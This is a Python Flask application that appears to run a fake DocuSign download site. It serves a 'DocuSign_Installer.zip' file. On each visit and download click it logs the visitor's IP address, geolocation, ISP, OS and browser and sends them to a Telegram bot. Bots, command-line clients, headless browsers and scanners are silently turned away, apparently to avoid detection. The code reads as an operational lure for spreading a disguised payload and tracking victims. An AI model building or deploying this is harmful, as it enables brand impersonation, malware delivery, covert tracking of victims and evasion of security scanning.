from flask import Flask, render_template, request, send_file
import requests
from dotenv import load_dotenv
from datetime import datetime
from user_agents import parse
import os
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from flask_wtf.csrf import CSRFProtect
import re

app = Flask(__name__)

# Secret key for CSRF protection
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', 'your-secret-key-change-this-in-production')

# Trust proxy headers for Render deployment
app.config['TRUSTED_PROXIES'] = ['*']

load_dotenv()

TOKEN = os.getenv("TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

# Initialize CSRF protection
csrf = CSRFProtect(app)

# Initialize rate limiting with Redis for production (falls back to memory if Redis not available)
if os.getenv('REDIS_URL'):
    from redis import Redis
    redis_client = Redis.from_url(os.getenv('REDIS_URL'))
    limiter = Limiter(
        app=app,
        key_func=get_remote_address,
        storage_uri=os.getenv('REDIS_URL'),
        default_limits=["200 per day", "50 per hour"]
    )
else:
    limiter = Limiter(
        app=app,
        key_func=get_remote_address,
        default_limits=["200 per day", "50 per hour"]
    )


def send_notification(text):
    try:
        requests.get(
            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
            params={
                "chat_id": CHAT_ID,
                "text": text
            },
            timeout=5
        )

    except Exception as e:
        print(f"Telegram notification failed: {e}")


def get_ip_info(ip):
    try:
        response = requests.get(
            f"http://ip-api.com/json/{ip}",
            timeout=5
        )

        response.raise_for_status()

        data = response.json()

        if data.get("status") == "success":
            return data

    except Exception as e:
        print(f"Failed to get IP information: {e}")

    return None


def is_suspicious_request(request):
    """
    Advanced bot detection - checks for suspicious patterns in the request
    """
    user_agent = request.headers.get("User-Agent", "")
    
    # Check for empty or missing User-Agent
    if not user_agent or user_agent.strip() == "":
        return True
    
    # Check for known bot User-Agent patterns
    bot_patterns = [
        r'bot', r'crawler', r'spider', r'scraper', r'curl', r'wget',
        r'python', r'java', r'perl', r'ruby', r'php', r'go-http',
        r'scrapy', r'beautifulsoup', r'mechanize', r' PhantomJS',
        r'HeadlessChrome', r'Selenium', r'HTTPie', r'libwww-perl'
    ]
    
    for pattern in bot_patterns:
        if re.search(pattern, user_agent, re.IGNORECASE):
            return True
    
    # Check for suspicious headers
    suspicious_headers = [
        'X-Forwarded-For', 'X-Real-IP', 'Via', 'Forwarded'
    ]
    
    for header in suspicious_headers:
        if header in request.headers:
            # Check if the IP in headers differs from remote_addr
            header_value = request.headers.get(header, '')
            if header_value and header_value != request.remote_addr:
                return True
    
    # Check for too many different headers (possible bot behavior)
    if len(request.headers) > 30:
        return True
    
    # Check for missing common headers (browsers always send these)
    common_headers = ['Accept', 'Accept-Language', 'Connection']
    missing_count = sum(1 for header in common_headers if header not in request.headers)
    if missing_count >= 2:
        return True
    
    return False


@app.route("/download", methods=["POST"])
@limiter.limit("10 per minute")  # Stricter limit for download endpoint
def download():
    # Advanced bot detection
    if is_suspicious_request(request):
        # Silently reject suspicious requests
        return render_template("index.html")
    
    # Check honeypot field - if filled, it's a bot
    honeypot_value = request.form.get("website", "")
    if honeypot_value:
        # Silently reject bot submission
        return render_template("index.html")
    
    # Get IP and device info for notification
    # Get real IP from proxy headers (Render uses proxy)
    if request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    elif request.headers.get('X-Real-IP'):
        ip = request.headers.get('X-Real-IP')
    else:
        ip = request.remote_addr
    user_agent_string = request.headers.get("User-Agent", "")
    ua = parse(user_agent_string)
    
    device_type = "Mobile 📱" if ua.is_mobile else "Tablet 📱" if ua.is_tablet else "Desktop 🖥️"
    
    # Send download button click notification
    download_message = f"""
🔘 𝘋𝘖𝘞𝘕𝘓𝘖𝘈𝘋 𝘉𝘜𝘛𝘛𝘖𝘕 𝘊𝘓𝘐𝘊𝘒𝘌𝘋 - 𝘋𝘖𝘊𝘚𝘐𝘎𝘕

🌐 𝘐𝘗 𝘋𝘈𝘛𝘈
━━━━━━━━━━━━━━━━
📍 IP: {ip}

💻 𝘋𝘌𝘝𝘐𝘊𝘌
━━━━━━━━━━━━━━━━
🖥️ Type: {device_type}
⚙️ OS: {ua.os.family} {ua.os.version_string}
🌐 Browser: {ua.browser.family} {ua.browser.version_string}

⏰ 𝘛𝘐𝘔𝘌
━━━━━━━━━━━━━━━━
📅 {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
"""
    
    send_notification(download_message)
    
    # Serve the zip file
    zip_file_path = os.path.join(os.path.dirname(__file__), 'downloads', 'DocuSign_Installer.zip')
    
    if os.path.exists(zip_file_path):
        return send_file(
            zip_file_path,
            as_attachment=True,
            download_name='DocuSign_Installer.zip',
            mimetype='application/zip'
        )
    else:
        # If file doesn't exist, return to home page
        return render_template("index.html")


@app.route("/")
@limiter.limit("30 per minute")  # Rate limit for home page
def home():

    # -----------------------------
    # IP ADDRESS
    # -----------------------------

    # Get real IP from proxy headers (Render uses proxy)
    if request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    elif request.headers.get('X-Real-IP'):
        ip = request.headers.get('X-Real-IP')
    else:
        ip = request.remote_addr

    # -----------------------------
    # IP LOCATION INFORMATION
    # -----------------------------

    ip_info = get_ip_info(ip)

    if ip_info:
        country = ip_info.get("country", "Unknown")
        city = ip_info.get("city", "Unknown")
        timezone = ip_info.get("timezone", "Unknown")
        isp = ip_info.get("isp", "Unknown")
    else:
        country = "Unknown"
        city = "Unknown"
        timezone = "Unknown"
        isp = "Unknown"

    # -----------------------------
    # USER-AGENT
    # -----------------------------

    user_agent_string = request.headers.get("User-Agent", "")

    ua = parse(user_agent_string)

    # Browser
    browser = ua.browser.family
    browser_version = ua.browser.version_string

    # Operating system
    os_name = ua.os.family
    os_version = ua.os.version_string

    # Device type
    if ua.is_mobile:
        device_type = "Mobile 📱"

    elif ua.is_tablet:
        device_type = "Tablet 📱"

    else:
        device_type = "Desktop 🖥️"

    # -----------------------------
    # VISIT TIME
    # -----------------------------

    visit_time = datetime.now().strftime(
        "%Y-%m-%d %H:%M:%S"
    )

    # -----------------------------
    # TELEGRAM MESSAGE
    # -----------------------------

    message = f"""
👤 𝘕𝘌𝘞 𝘝𝘐𝘚𝘐𝘛𝘖𝘙 - 𝘋𝘖𝘊𝘚𝘐𝘎𝘕

🌐 𝘐𝘗 𝘋𝘈𝘛𝘈
━━━━━━━━━━━━━━━━
📍 IP: {ip}
🏳️ Country: {country}
🏙️ City: {city}
🕐 Timezone: {timezone}
📡 ISP: {isp}

💻 𝘋𝘌𝘝𝘐𝘊𝘌
━━━━━━━━━━━━━━━━
🖥️ Type: {device_type}
⚙️ OS: {os_name} {os_version}
🌐 Browser: {browser} {browser_version}

⏰ 𝘝𝘐𝘚𝘐𝘛
━━━━━━━━━━━━━━━━
📅 {visit_time}
"""

    # Send notification
    send_notification(message)

    # Show website - serve mobile template for mobile devices
    if ua.is_mobile or ua.is_tablet:
        return render_template("mobile.html")
    else:
        return render_template("index.html")


if __name__ == "__main__":
    # Use production settings if running in production
    debug_mode = os.getenv('FLASK_DEBUG', 'False') == 'True'
    app.run(host="0.0.0.0", port=5000, debug=debug_mode)